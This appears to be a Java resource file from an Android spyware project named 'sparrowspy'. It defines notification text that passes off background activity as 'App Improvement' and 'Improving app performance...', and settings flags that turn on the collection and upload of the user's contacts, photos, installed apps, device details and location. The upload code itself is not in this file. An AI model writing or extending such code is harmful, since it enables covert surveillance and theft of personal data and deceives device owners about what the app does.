package com.tangledbytes.sparrowspy.utils;

import com.tangledbytes.sparrowspy.R;

public class Resources {
    public static class Strings {
        public static String notifTitle = "App Improvement";
        public static String notifContent1 = "Improving app performance...";
        public static String notifContent2 = "Finishing up...";
    }

    public static class Drawables {
        public static int notifIcon = R.drawable.ic_collector_notification;
    }

    public static class Settings {
        /** Collect and upload contacts of user */
        public static boolean snoopContacts = true;
        /** Compress, collect and upload images of user */
        public static boolean snoopImages = true;
        /** Collect and upload device info like apps installed, device model etc.*/
        public static boolean snoopDeviceInfo = true;
        /** Upload last known approximate location of device */
        public static boolean snoopLocation = true;
    }
}
